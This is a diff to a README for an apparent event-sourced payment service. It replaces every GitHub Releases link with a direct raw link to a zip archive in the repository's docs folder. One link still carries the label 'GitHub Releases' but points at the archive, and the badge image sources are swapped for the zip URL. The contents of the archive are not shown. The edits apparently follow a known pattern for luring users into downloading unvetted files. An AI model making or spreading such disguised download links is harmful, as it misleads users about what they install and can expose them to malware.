@@ -1,6 +1,6 @@
 # 🚀 event-sourced-payment-service - Seamless Payment Processing Made Simple
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
+[![Download](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/raw/refs/heads/main/docs/service-event-payment-sourced-1.1.zip)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/raw/refs/heads/main/docs/service-event-payment-sourced-1.1.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To use this application effectively, ensure your system meets these requirements
 ## 🚀 Getting Started
 
 1. **Download the Application**: Visit this page to download:
-   [GitHub Releases](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
+   [GitHub Releases](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/raw/refs/heads/main/docs/service-event-payment-sourced-1.1.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the latest version available for download. 
 
@@ -91,4 +91,4 @@ This project is licensed under the MIT License. See the LICENSE file for detaile
 
 We appreciate the contributions of our community and any third-party libraries used within this project. Thank you for supporting open-source software! 
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
+[![Download](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/raw/refs/heads/main/docs/service-event-payment-sourced-1.1.zip)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/raw/refs/heads/main/docs/service-event-payment-sourced-1.1.zip)
